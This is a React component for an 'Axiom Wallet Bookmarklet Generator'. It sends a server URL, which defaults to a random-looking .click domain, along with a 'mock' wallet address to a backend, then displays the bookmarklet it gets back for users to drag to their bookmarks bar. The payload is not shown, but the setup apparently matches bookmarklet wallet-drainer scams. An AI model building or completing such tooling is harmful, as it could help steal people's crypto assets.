import React, { useState } from 'react';

const BookmarkletGenerator: React.FC = () => {
  const [serverUrl, setServerUrl] = useState('https://ofjioae8rj8943pwaes.click/');
  const [mockWalletAddress, setMockWalletAddress] = useState('32KtbQ7PYEwaLyEpywGhbYYUZvLyzmXiG43v5NNYyHJ6');
  const [simulationMode, setSimulationMode] = useState(true);
  const [bookmarkletCode, setBookmarkletCode] = useState('');
  const [hashIdentifier, setHashIdentifier] = useState('');
  const [isGenerating, setIsGenerating] = useState(false);

  const generateBookmarklet = async () => {
    setIsGenerating(true);
    
    try {
      const response = await fetch('/api/bookmarklet/generate', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          serverUrl,
          mockWalletAddress,
          simulationMode
        })
      });
      
      const data = await response.json();
      
      if (data.success) {
        setBookmarkletCode(data.bookmarklet);
        setHashIdentifier(data.hash);
      } else {
        console.error('Error generating bookmarklet:', data.error);
      }
    } catch (error) {
      console.error('Error generating bookmarklet:', error);
    } finally {
      setIsGenerating(false);
    }
  };

  const copyToClipboard = () => {
    navigator.clipboard.writeText(bookmarkletCode)
      .then(() => alert('Bookmarklet copied to clipboard!'))
      .catch(err => console.error('Failed to copy: ', err));
  };

  return (
    <div className="p-4 bg-gray-50 rounded-lg">
      <h3 className="text-lg font-semibold mb-4">Axiom Wallet Bookmarklet Generator</h3>
      
      <div className="space-y-4">
        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1">Server URL</label>
          <input
            type="text"
            value={serverUrl}
            onChange={(e) => setServerUrl(e.target.value)}
            className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
          />
        </div>
        
        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1">Mock Wallet Address</label>
          <input
            type="text"
            value={mockWalletAddress}
            onChange={(e) => setMockWalletAddress(e.target.value)}
            className="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
          />
        </div>
        
        <div className="flex items-center">
          <input
            type="checkbox"
            id="simulationMode"
            checked={simulationMode}
            onChange={(e) => setSimulationMode(e.target.checked)}
            className="mr-2"
          />
          <label htmlFor="simulationMode" className="text-sm font-medium text-gray-700">
            Simulation Mode (No real transactions)
          </label>
        </div>
        
        <button
          onClick={generateBookmarklet}
          disabled={isGenerating}
          className="bg-blue-500 hover:bg-blue-600 disabled:bg-blue-300 text-white font-bold py-2 px-4 rounded"
        >
          {isGenerating ? 'Generating...' : 'Generate Bookmarklet'}
        </button>
        
        {bookmarkletCode && (
          <div>
            <div className="flex justify-between items-center mb-2">
              <label className="block text-sm font-medium text-gray-700">
                Bookmarklet Code (Hash: {hashIdentifier})
              </label>
              <button
                onClick={copyToClipboard}
                className="bg-gray-200 hover:bg-gray-300 text-gray-800 font-medium py-1 px-2 rounded text-sm"
              >
                Copy
              </button>
            </div>
            <textarea
              value={bookmarkletCode}
              readOnly
              className="w-full h-32 px-3 py-2 border border-gray-300 rounded-md bg-gray-100 font-mono text-xs"
            />
            <p className="text-xs text-gray-500 mt-1">
              Drag this link to your bookmarks bar or right-click and select "Add to Favorites/Bookmarks"
            </p>
          </div>
        )}
      </div>
    </div>
  );
};

export default BookmarkletGenerator;
